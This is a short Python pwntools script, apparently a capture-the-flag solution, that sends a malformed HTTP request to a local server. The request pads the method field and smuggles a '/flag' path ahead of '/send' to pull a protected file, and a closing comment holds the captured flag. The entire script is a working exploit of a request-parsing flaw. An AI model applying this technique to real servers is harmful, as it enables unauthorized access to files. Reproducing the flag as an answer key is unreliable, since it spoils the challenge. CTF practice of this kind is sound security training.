#!/usr/bin/env python3

from pwn import *

# Configuration
HOST = "localhost"
PORT = 8000

p = remote(HOST, PORT)
payload = b"GET".ljust(16, b'T') + b"/flag " + b"/send HTTP/1.1\r\n\r\n"
print(f"[+] Sending malformed request: {repr(payload)}")
p.send(payload)
response = p.recv()
print(f"[+] Response received:")
print(response.decode(errors='ignore'))
p.close()

# NNS{wh4t_d0_y0u_m34n_my_53rv3r_15n7_s3cur3?_4nd_n0_1_w0n7_u53_Rust_22772669ee35}
